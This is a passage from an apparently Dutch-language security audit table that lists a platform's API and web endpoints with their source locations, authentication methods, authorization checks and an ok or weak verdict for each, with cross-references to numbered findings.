| GET | `/api/v1/restore/snapshots/{cluster}/{namespace}` | opi/api/restore_router.py:612 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) + _require_namespace_owned_by_project (restore_router.py:68-98) | ok |
| GET | `/api/v1/restore/snapshots/{cluster}/{namespace}/{pvc_name}` | opi/api/restore_router.py:655 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) + _require_namespace_owned_by_project (restore_router.py:68-98) | ok |
| POST | `/api/v1/restore/pvc/{cluster}/{namespace}/{pvc_name}` | opi/api/restore_router.py:696 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) + _require_namespace_owned_by_project (restore_router.py:68-98) | ok |
| POST | `/api/v1/restore/project/{project_name}` | opi/api/restore_router.py:806 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/v1/restore/project/{project_name}/deployment/{deployment_name}/run/{backup_run_id}` | opi/api/restore_router.py:1333 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/v1/restore/database/{cluster}/{namespace}/{reference_name}` | opi/api/restore_router.py:1752 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) + _require_namespace_owned_by_project (restore_router.py:68-98) | ok, zie B-14 |
| POST | `/api/v1/restore/bucket/{cluster}/{namespace}/{reference_name}` | opi/api/restore_router.py:1903 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) + _require_namespace_owned_by_project (restore_router.py:68-98) | ok, zie B-14 |
| POST | `/api/v1/restore/project/{project_name}/deployment/{deployment_name}` | opi/api/restore_router.py:2044 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/v1/projects/{project_name}/images/push` | opi/api/image_router.py:30 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| GET | `/api/logs/{project_name}` | opi/api/logs_router.py:100 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| GET | `/api/logs/pods/{project_name}` | opi/api/logs_router.py:238 | sessie (inline) | get_user + is_email_allowed + is_user_authorized_for_project (logs_router.py:253-258) | ok |
| WS | `/api/logs/stream/{project_name}` | opi/api/logs_websocket_router.py:331 | sessie-cookie (handmatig geverifieerd) | Origin-check :367, cookie TimestampSigner :134-180, allowlist :388, lidmaatschap :397 | ok |
| POST | `/api/resources/{project_name}/tune` | opi/api/resource_router.py:65 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/resources/{project_name}/sanitize` | opi/api/resource_router.py:106 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/sleep-mode/{project_name}/{deployment_name}/wake` | opi/services/catalog/sleep_mode/router.py:71 | X-Wake-Token of api-key | _presented_token (sleep_mode/router.py:58-61), verificatie in flow.py:141 na 404-check | ok, zie B-11 |
| GET | `/api/sleep-mode/{project_name}/{deployment_name}/status` | opi/services/catalog/sleep_mode/router.py:106 | X-Wake-Token of api-key | _presented_token (sleep_mode/router.py:58-61), verificatie in flow.py:141 na 404-check | ok, zie B-11 |
| GET | `/api/v2/projects/{project_name}/clusters` | opi/api/v2/router.py:499 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| GET | `/api/v2/projects/{project_name}/subdomains/check/{subdomain}` | opi/api/v2/router.py:579 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| GET | `/api/v2/projects/{project_name}/deployments` | opi/api/v2/router.py:683 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| GET | `/api/v2/projects/{project_name}/deployments/{deployment_name}` | opi/api/v2/router.py:714 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| GET | `/api/v2/projects/{project_name}/pending-rollout` | opi/api/v2/router.py:826 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| GET | `/api/v2/projects/{project_name}/services` | opi/api/v2/router.py:912 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| GET | `/api/v2/projects/{project_name}/components` | opi/api/v2/router.py:951 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| GET | `/api/v2/projects/{project_name}` | opi/api/v2/router.py:990 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/v2/projects/{project_name}/:upsert-deployment` | opi/api/v2/router.py:1045 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| GET | `/api/v2/projects` | opi/api/v2/router.py:1124 | bearer | validate_user_token + is_email_allowed (user_token_auth.py:215); lidmaatschap per project (v2/router.py:1176) | ok, zie B-5 |
| POST | `/api/v2/projects` | opi/api/v2/router.py:1196 | bearer | validate_user_token; elke allowlist-gebruiker mag aanmaken (v2/router.py:1196-1297) | ok, zie B-15 |
| POST | `/api/v2/projects/{project_name}/:refresh` | opi/api/v2/router.py:1300 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/{deployment_name}` | opi/api/v2/router.py:1345 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/v2/projects/{project_name}/deployments/{deployment_name}/image` | opi/api/v2/router.py:1384 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/v2/projects/{project_name}/deployments/{deployment_name}/:clone-database` | opi/api/v2/router.py:1439 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/v2/projects/{project_name}/deployments/{deployment_name}/:clone-bucket` | opi/api/v2/router.py:1480 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/v2/projects/{project_name}/deployments/{deployment_name}/:refresh` | opi/api/v2/router.py:1521 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/v2/projects/{project_name}/components` | opi/api/v2/router.py:1569 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PATCH | `/api/v2/projects/{project_name}/components/{component_name}` | opi/api/v2/router.py:1638 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/components/{component_name}` | opi/api/v2/router.py:1715 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/v2/projects/{project_name}/deployments/{deployment_name}/components` | opi/api/v2/router.py:1810 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/v2/projects/{project_name}/services` | opi/api/v2/router.py:1875 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| GET | `/api/v2/services` | opi/api/v2/router.py:2101 | geen | catalogus-metadata, projectonafhankelijk (v2/router.py:2101-2112) | ok |
| GET | `/api/v2/services/{service_name}` | opi/api/v2/router.py:2289 | geen | catalogus-metadata, projectonafhankelijk (v2/router.py:2101-2112) | ok |
| GET | `/api/v2/projects/{project_name}/services/{service_name}/config` | opi/api/v2/router.py:2408 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok, zie B-9 |
| PUT | `/api/v2/projects/{project_name}/services/publish-on-web/config/component/{component_name}` | opi/api/v2/router.py:2674 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/publish-on-web/config/component/{component_name}` | opi/api/v2/router.py:2716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/v2/projects/{project_name}/services/publish-on-web/config/deployment/{deployment_name}` | opi/api/v2/router.py:2674 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/publish-on-web/config/deployment/{deployment_name}` | opi/api/v2/router.py:2716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/v2/projects/{project_name}/services/keycloak/config/project` | opi/api/v2/router.py:2674 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/keycloak/config/project` | opi/api/v2/router.py:2716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/v2/projects/{project_name}/services/authorization-wall/config/project` | opi/api/v2/router.py:2674 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/authorization-wall/config/project` | opi/api/v2/router.py:2716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/v2/projects/{project_name}/services/metrics-scraper/config/component/{component_name}` | opi/api/v2/router.py:2674 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/metrics-scraper/config/component/{component_name}` | opi/api/v2/router.py:2716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/v2/projects/{project_name}/services/health-check/config/component/{component_name}` | opi/api/v2/router.py:2674 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/health-check/config/component/{component_name}` | opi/api/v2/router.py:2716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/v2/projects/{project_name}/services/image-registries/config/project` | opi/api/v2/router.py:2674 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/image-registries/config/project` | opi/api/v2/router.py:2716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/v2/projects/{project_name}/services/image-registries/config/component/{component_name}` | opi/api/v2/router.py:2674 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/image-registries/config/component/{component_name}` | opi/api/v2/router.py:2716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/v2/projects/{project_name}/services/persistent-storage/config/component/{component_name}` | opi/api/v2/router.py:2674 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/persistent-storage/config/component/{component_name}` | opi/api/v2/router.py:2716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PATCH | `/api/v2/projects/{project_name}/services/persistent-storage/config/component/{component_name}` | opi/api/v2/router.py:2830 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/v2/projects/{project_name}/services/temp-storage/config/component/{component_name}` | opi/api/v2/router.py:2674 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/temp-storage/config/component/{component_name}` | opi/api/v2/router.py:2716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PATCH | `/api/v2/projects/{project_name}/services/temp-storage/config/component/{component_name}` | opi/api/v2/router.py:2830 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/v2/projects/{project_name}/services/postgresql-database/config/project` | opi/api/v2/router.py:2674 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/postgresql-database/config/project` | opi/api/v2/router.py:2716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/v2/projects/{project_name}/services/postgresql-database/config/deployment/{deployment_name}` | opi/api/v2/router.py:2674 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/postgresql-database/config/deployment/{deployment_name}` | opi/api/v2/router.py:2716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/v2/projects/{project_name}/services/namespace-postgresql-database/config/project` | opi/api/v2/router.py:2674 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/namespace-postgresql-database/config/project` | opi/api/v2/router.py:2716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/v2/projects/{project_name}/services/minio-storage/config/project` | opi/api/v2/router.py:2674 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/minio-storage/config/project` | opi/api/v2/router.py:2716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/v2/projects/{project_name}/services/minio-storage/config/deployment/{deployment_name}` | opi/api/v2/router.py:2674 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/minio-storage/config/deployment/{deployment_name}` | opi/api/v2/router.py:2716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/v2/projects/{project_name}/services/send-email/config/project` | opi/api/v2/router.py:2674 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/send-email/config/project` | opi/api/v2/router.py:2716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/v2/projects/{project_name}/services/redis/config/project` | opi/api/v2/router.py:2674 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/redis/config/project` | opi/api/v2/router.py:2716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/v2/projects/{project_name}/services/attachments/config/component/{component_name}` | opi/api/v2/router.py:2674 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/attachments/config/component/{component_name}` | opi/api/v2/router.py:2716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PATCH | `/api/v2/projects/{project_name}/services/attachments/config/component/{component_name}` | opi/api/v2/router.py:2830 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/v2/projects/{project_name}/services/sleep-mode/config/project` | opi/api/v2/router.py:2674 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/sleep-mode/config/project` | opi/api/v2/router.py:2716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PATCH | `/api/v2/projects/{project_name}/services/sleep-mode/config/project/match` | opi/api/v2/router.py:2830 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/v2/projects/{project_name}/services/invite/config/project` | opi/api/v2/router.py:2674 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/invite/config/project` | opi/api/v2/router.py:2716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PATCH | `/api/v2/projects/{project_name}/services/invite/config/project/active` | opi/api/v2/router.py:2830 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/v2/projects/{project_name}/services/cross-domain-access/config/project` | opi/api/v2/router.py:2674 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/cross-domain-access/config/project` | opi/api/v2/router.py:2716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PATCH | `/api/v2/projects/{project_name}/services/cross-domain-access/config/project/inbound` | opi/api/v2/router.py:2830 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PATCH | `/api/v2/projects/{project_name}/services/cross-domain-access/config/project/outbound` | opi/api/v2/router.py:2830 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/v2/projects/{project_name}/services/cross-domain-access/config/deployment/{deployment_name}` | opi/api/v2/router.py:2674 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/cross-domain-access/config/deployment/{deployment_name}` | opi/api/v2/router.py:2716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PATCH | `/api/v2/projects/{project_name}/services/cross-domain-access/config/deployment/{deployment_name}/inbound` | opi/api/v2/router.py:2830 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PATCH | `/api/v2/projects/{project_name}/services/cross-domain-access/config/deployment/{deployment_name}/outbound` | opi/api/v2/router.py:2830 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| GET | `/api/v2/projects/{project_name}/services/postgresql-database/schemas` | opi/api/v2/router.py:3185 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/v2/projects/{project_name}/services/postgresql-database/schemas` | opi/api/v2/router.py:3297 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/postgresql-database/schemas/{postfix}` | opi/api/v2/router.py:3381 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/v2/projects/{project_name}/services/attachments/attachment` | opi/api/v2/router.py:3716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/v2/projects/{project_name}/services/attachments/attachment/{attachment_id}` | opi/api/v2/router.py:3716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/attachments/attachment/{attachment_id}` | opi/api/v2/router.py:3716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/v2/projects/{project_name}/services/attachments/component/{component_name}/attachment` | opi/api/v2/router.py:3716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PUT | `/api/v2/projects/{project_name}/services/attachments/component/{component_name}/attachment/{attachment_id}` | opi/api/v2/router.py:3716 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/v2/projects/{project_name}/services/user-env-vars/values/component/{component_name}` | opi/api/v2/router.py:3948 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PATCH | `/api/v2/projects/{project_name}/services/user-env-vars/values/component/{component_name}` | opi/api/v2/router.py:3948 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/user-env-vars/values/component/{component_name}` | opi/api/v2/router.py:3948 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/user-env-vars/values/component/{component_name}/{value_key}` | opi/api/v2/router.py:3948 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/v2/projects/{project_name}/services/user-env-vars/values/component/{component_name}/:delete` | opi/api/v2/router.py:3948 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| GET | `/api/v2/projects/{project_name}/services/user-env-vars/values/component/{component_name}` | opi/api/v2/router.py:4041 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/v2/projects/{project_name}/services/user-env-vars/values/deployment/{deployment_name}/component/{component_name}` | opi/api/v2/router.py:3948 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PATCH | `/api/v2/projects/{project_name}/services/user-env-vars/values/deployment/{deployment_name}/component/{component_name}` | opi/api/v2/router.py:3948 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/user-env-vars/values/deployment/{deployment_name}/component/{component_name}` | opi/api/v2/router.py:3948 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/user-env-vars/values/deployment/{deployment_name}/component/{component_name}/{value_key}` | opi/api/v2/router.py:3948 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/v2/projects/{project_name}/services/user-env-vars/values/deployment/{deployment_name}/component/{component_name}/:delete` | opi/api/v2/router.py:3948 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| GET | `/api/v2/projects/{project_name}/services/user-env-vars/values/deployment/{deployment_name}/component/{component_name}` | opi/api/v2/router.py:4041 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/v2/projects/{project_name}/services/aliases/values/component/{component_name}` | opi/api/v2/router.py:3948 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| PATCH | `/api/v2/projects/{project_name}/services/aliases/values/component/{component_name}` | opi/api/v2/router.py:3948 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/aliases/values/component/{component_name}` | opi/api/v2/router.py:3948 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| DELETE | `/api/v2/projects/{project_name}/services/aliases/values/component/{component_name}/{value_key}` | opi/api/v2/router.py:3948 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| POST | `/api/v2/projects/{project_name}/services/aliases/values/component/{component_name}/:delete` | opi/api/v2/router.py:3948 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| GET | `/api/v2/projects/{project_name}/services/aliases/values/component/{component_name}` | opi/api/v2/router.py:4041 | api-key | validate_api_token: X-API-Key vs project_store.get(project_name).api_key (endpoint_util.py:66-74) | ok |
| GET | `/api/tasks/{task_id}` | opi/api/task_router.py:160 | api-key of bearer (inline) | _validate_task_access (task_router.py:117): key vs task.project_name of bearer email == created_by | ok |
| GET | `/api/tasks` | opi/api/task_router.py:240 | api-key (inline) | key vs verplichte query project_name (task_router.py:262-268); lijst server-side gefilterd | ok |
| POST | `/api/tasks/{task_id}/:cancel` | opi/api/task_router.py:293 | api-key of bearer (inline) | _validate_task_access (task_router.py:117): key vs task.project_name of bearer email == created_by | ok |
| POST | `/api/tasks` | opi/api/task_router.py:323 | master-key | validate_master_api_key (endpoint_util.py:158-182) | ok (master maakt elke taak voor elk project) |
| GET | `/api/federation/peers` | opi/api/federation_router.py:27 | master-key | validate_master_api_key (endpoint_util.py:158-182) | ok |
| GET | `/api/federation/health` | opi/api/federation_router.py:47 | master-key | validate_master_api_key (endpoint_util.py:158-182) | ok |
| GET | `/api/v2/admin/marked-for-deletion` | opi/api/admin_router.py:42 | admin-key | validate_admin_api_key (endpoint_util.py:117-141) | ok |
| POST | `/api/v2/admin/cleanup/trigger` | opi/api/admin_router.py:75 | admin-key | validate_admin_api_key (endpoint_util.py:117-141) | ok |
| POST | `/api/v2/admin/reconciliation/trigger` | opi/api/admin_router.py:109 | admin-key | validate_admin_api_key (endpoint_util.py:117-141) | ok |
| DELETE | `/api/v2/admin/marked-for-deletion/{mark_id}` | opi/api/admin_router.py:155 | admin-key | validate_admin_api_key (endpoint_util.py:117-141) | ok |
| GET | `/api/v2/admin/orphans/report` | opi/api/admin_router.py:185 | admin-key | validate_admin_api_key (endpoint_util.py:117-141) | ok |
| POST | `/api/v2/admin/orphans/confirm` | opi/api/admin_router.py:208 | admin-key | validate_admin_api_key (endpoint_util.py:117-141) | ok |
| POST | `/api/v2/admin/projects/:reconcile` | opi/api/admin_router.py:295 | admin-key | validate_admin_api_key (endpoint_util.py:117-141) | ok |
| GET | `/metrics` | opi/api/prometheus_router.py:22 | geen | publiek: Prometheus scrape (B-6) | zie bevinding |
| GET | `/invite/{key}` | opi/api/invite_routes.py:314 | geen (invite-key in pad) | _find_project_by_invite_key: key moet in active staan (invite_routes.py:183-224); geen verloop, geen max-uses | zwak (B-8) |
| GET | `/invite/{key}/sso` | opi/api/invite_routes.py:387 | geen (invite-key in pad) | _find_project_by_invite_key: key moet in active staan (invite_routes.py:183-224); geen verloop, geen max-uses | zwak (B-8) |
| GET | `/invite/{key}/idp/{idp_alias}` | opi/api/invite_routes.py:454 | geen (invite-key in pad) | _find_project_by_invite_key: key moet in active staan (invite_routes.py:183-224); geen verloop, geen max-uses | zwak (B-8) |
| GET | `/invite/{key}/sso/callback` | opi/api/invite_routes.py:532 | geen (invite-key in pad) | _find_project_by_invite_key: key moet in active staan (invite_routes.py:183-224); geen verloop, geen max-uses | zwak (B-8) |
| GET | `/invite/{key}/register` | opi/api/invite_routes.py:649 | geen (invite-key in pad) | _find_project_by_invite_key: key moet in active staan (invite_routes.py:183-224); geen verloop, geen max-uses | zwak (B-8) |
| POST | `/invite/{key}/register` | opi/api/invite_routes.py:721 | geen (invite-key in pad) | _find_project_by_invite_key: key moet in active staan (invite_routes.py:183-224); geen verloop, geen max-uses | zwak (B-8) |
| GET | `/invite/{key}/success` | opi/api/invite_routes.py:925 | geen (invite-key in pad) | _find_project_by_invite_key: key moet in active staan (invite_routes.py:183-224); geen verloop, geen max-uses | zwak (B-8) |
| GET | `/invite/{key}/error` | opi/api/invite_routes.py:989 | geen (invite-key in pad) | _find_project_by_invite_key: key moet in active staan (invite_routes.py:183-224); geen verloop, geen max-uses | zwak (B-8) |
| GET | `/services` | opi/web/services_router.py:20 | sessie | alleen ingelogd + allowlist (middleware), geen projectcontext | ok |
| GET | `/metrics-explorer` | opi/web/metrics_explorer_router.py:78 | sessie | require_platform_admin (metrics_explorer_router.py:87) | ok |
| GET | `/ui/metrics-explorer/metrics/{service_id}` | opi/web/metrics_explorer_router.py:106 | sessie | require_platform_admin (:118) | ok |
| POST | `/projects/{project_name}/edit/{section_id}/sequence` | opi/web/router_detail_edit.py:599 | sessie | require_project_edit_access (router_detail_edit.py:603) | ok |
| GET | `/projects/{project_name}/modal-wizard/{flow_id}` | opi/web/router_detail_edit.py:652 | sessie | lid voor backup/restore, anders edit (router_detail_edit.py:657-660) | ok, zie B-4 |
| GET | `/projects/{project_name}/modal-wizard/{flow_id}/step/{section_id}` | opi/web/router_detail_edit.py:851 | sessie | edit / lid (router_detail_edit.py:856, 881-884); state.project_name niet vergeleken met pad | ok, zie B-4/B-10 |
| POST | `/projects/{project_name}/modal-wizard/{flow_id}/step/{section_id}` | opi/web/router_detail_edit.py:877 | sessie | edit / lid (router_detail_edit.py:856, 881-884); state.project_name niet vergeleken met pad | ok, zie B-4/B-10 |
